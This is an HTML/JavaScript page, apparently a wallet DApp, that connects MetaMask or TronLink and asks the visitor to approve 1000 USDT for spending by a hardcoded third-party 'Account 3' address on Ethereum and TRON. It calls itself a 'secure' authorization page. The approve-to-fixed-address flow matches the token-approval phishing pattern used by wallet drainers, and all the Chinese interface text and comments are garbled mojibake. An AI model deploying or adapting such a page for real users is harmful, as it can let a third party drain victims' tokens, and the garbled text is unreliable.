<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8" />
  <title>è·¨é“¾æˆæƒ USDTï¼ˆDApp å®‰å…¨ç‰ˆï¼‰</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      max-width: 600px;
      margin: auto;
      padding: 20px;
      background-color: #f5f5f5;
    }
    .container {
      background: white;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
    }
    button {
      padding: 10px 20px;
      margin: 10px 0;
      font-size: 16px;
      cursor: pointer;
      background: #4CAF50;
      color: white;
      border: none;
      border-radius: 4px;
    }
    button:hover {
      background: #45a049;
    }
    .info {
      margin: 10px 0;
      padding: 10px;
      background: #e8f5e8;
      border-left: 4px solid #4CAF50;
    }
    .error {
      color: red;
      background: #ffebee;
      padding: 10px;
      border-left: 4px solid #f44336;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>ğŸ” è·¨é“¾æˆæƒ USDT</h2>
    <p>æ”¯æŒ MetaMaskï¼ˆETHï¼‰å’Œ TronLinkï¼ˆTRONï¼‰</p>

    <button id="connect">è¿æ¥é’±åŒ…</button>
    <div id="accountInfo"></div>
    <div id="chainInfo"></div>
    <button id="approve" disabled>æˆæƒ 1000 USDT ç»™ Account 3</button>
    <div id="result"></div>
  </div>

  <!-- åªå¼•å…¥ ethers.jsï¼ˆç”¨äº parseUnits ç­‰å·¥å…·å‡½æ•°ï¼‰ -->
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>

  <script>
    // ===================
    // é…ç½®ï¼ˆè¯·æŒ‰éœ€ä¿®æ”¹ account3ï¼‰
    // ===================
    const CONFIG = {
      ethereum: {
        token: "0xdac17f958d2ee523a2206206994597c13d831ec7", // ETH-USDT
        account3: "0x7d9a039c1b59b29e7c6a41aa4889c8db8e0b672d", // â† æ›¿æ¢ä¸ºä½ çš„ ETH åœ°å€
        decimals: 6
      },
      tron: {
        token: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", // TRON-USDT
        account3: "TENBpGLoxcAsUQvUrN36xpDKPYmadpc1x3", // TRON åœ°å€
        decimals: 6
      }
    };

    let currentChain = null;
    let signerOrTronWeb = null;

    // ===================
    // å·¥å…·ï¼šç­‰å¾…é’±åŒ…æ³¨å…¥å®Œæˆ
    // ===================
    function waitForProvider(providerName, timeout = 3000) {
      return new Promise((resolve) => {
        if (window[providerName]) {
          resolve(window[providerName]);
          return;
        }
        const start = Date.now();
        const check = setInterval(() => {
          if (window[providerName]) {
            clearInterval(check);
            resolve(window[providerName]);
          } else if (Date.now() - start > timeout) {
            clearInterval(check);
            resolve(null);
          }
        }, 100);
      });
    }

    // ===================
    // è¿æ¥é’±åŒ…ï¼ˆç”¨æˆ·ç‚¹å‡»è§¦å‘ï¼‰
    // ===================
    document.getElementById("connect").onclick = async () => {
      const resultDiv = document.getElementById("result");
      resultDiv.innerHTML = "";

      // 1. ç­‰å¾… TronLink
      const tronWeb = await waitForProvider('tronWeb');
      if (tronWeb && tronWeb.ready) {
        currentChain = 'tron';
        signerOrTronWeb = tronWeb;
        await handleTronConnect();
        return;
      }

      // 2. ç­‰å¾… MetaMask
      const ethereum = await waitForProvider('ethereum');
      if (ethereum) {
        currentChain = 'ethereum';
        try {
          const provider = new ethers.providers.Web3Provider(ethereum);
          await provider.send("eth_requestAccounts", []);
          signerOrTronWeb = provider.getSigner();
          await handleEthConnect();
          return;
        } catch (err) {
          resultDiv.innerHTML = `<div class="error">MetaMask æˆæƒè¢«æ‹’ç»</div>`;
          return;
        }
      }

      resultDiv.innerHTML = `<div class="error">æœªæ£€æµ‹åˆ°é’±åŒ…ã€‚è¯·åœ¨ TronLink æˆ– MetaMask ä¸­æ‰“å¼€æ­¤é¡µé¢ã€‚</div>`;
    };

    async function handleEthConnect() {
      try {
        const addr = await signerOrTronWeb.getAddress();
        document.getElementById("accountInfo").innerHTML = `<div class="info">âœ… ETH è´¦æˆ·ï¼š${addr}</div>`;
        document.getElementById("chainInfo").innerHTML = `<div class="info">ğŸŒ ç½‘ç»œï¼šEthereum</div>`;
        document.getElementById("approve").disabled = false;
        document.getElementById("result").innerHTML = `<div class="info">âœ… å·²è¿æ¥ï¼Œå¯æˆæƒ USDT</div>`;
      } catch (err) {
        document.getElementById("result").innerHTML = `<div class="error">ETH è¿æ¥å¤±è´¥ï¼š${err.message}</div>`;
      }
    }

    async function handleTronConnect() {
      try {
        // âœ… ä¸»åŠ¨è¯·æ±‚è´¦æˆ·ï¼ˆTronLink å®˜æ–¹è¦æ±‚ï¼‰
        const accounts = await signerOrTronWeb.request({ method: 'tron_requestAccounts' });
        const addr = accounts[0];

        document.getElementById("accountInfo").innerHTML = `<div class="info">âœ… TRON è´¦æˆ·ï¼š${addr}</div>`;
        document.getElementById("chainInfo").innerHTML = `<div class="info">ğŸŒ ç½‘ç»œï¼šTRON</div>`;
        document.getElementById("approve").disabled = false;
        document.getElementById("result").innerHTML = `<div class="info">âœ… å·²è¿æ¥ï¼Œå¯æˆæƒ USDT</div>`;
      } catch (err) {
        console.error("TronLink è¯·æ±‚å¤±è´¥", err);
        document.getElementById("result").innerHTML = `<div class="error">âŒ è¯·æˆæƒ TronLink è´¦æˆ·è®¿é—®</div>`;
      }
    }

    // ===================
    // æˆæƒæ“ä½œ
    // ===================
    document.getElementById("approve").onclick = async () => {
      const cfg = CONFIG[currentChain];
      const amountStr = "1000";
      let tx;

      try {
        if (currentChain === 'ethereum') {
          const amount = ethers.utils.parseUnits(amountStr, cfg.decimals);
          const contract = new ethers.Contract(
            cfg.token,
            ["function approve(address,uint256) external returns (bool)"],
            signerOrTronWeb
          );
          tx = await contract.approve(cfg.account3, amount);
          await tx.wait();
        } else {
          // TRON: ä½¿ç”¨ ethers å¤„ç†ç²¾åº¦ï¼Œå†è½¬å­—ç¬¦ä¸²
          const amount = ethers.utils.parseUnits(amountStr, cfg.decimals).toString();
          const contract = await signerOrTronWeb.contract().at(cfg.token);
          tx = await contract.approve(cfg.account3, amount).send({
            feeLimit: 100_000_000
          });
        }

        document.getElementById("result").innerHTML = `<div class="info">âœ… æˆæƒæˆåŠŸï¼<br>äº¤æ˜“ ID: ${tx.transaction ? tx.transaction : tx}</div>`;
      } catch (err) {
        console.error("æˆæƒå¤±è´¥", err);
        let msg = err.reason || err.message || String(err);
        if (msg.includes("user denied") || msg.includes("User denied")) {
          msg = "ç”¨æˆ·å–æ¶ˆäº†äº¤æ˜“";
        }
        document.getElementById("result").innerHTML = `<div class="error">âŒ æˆæƒå¤±è´¥ï¼š<br>${msg}</div>`;
      }
    };
  </script>
</body>
</html>
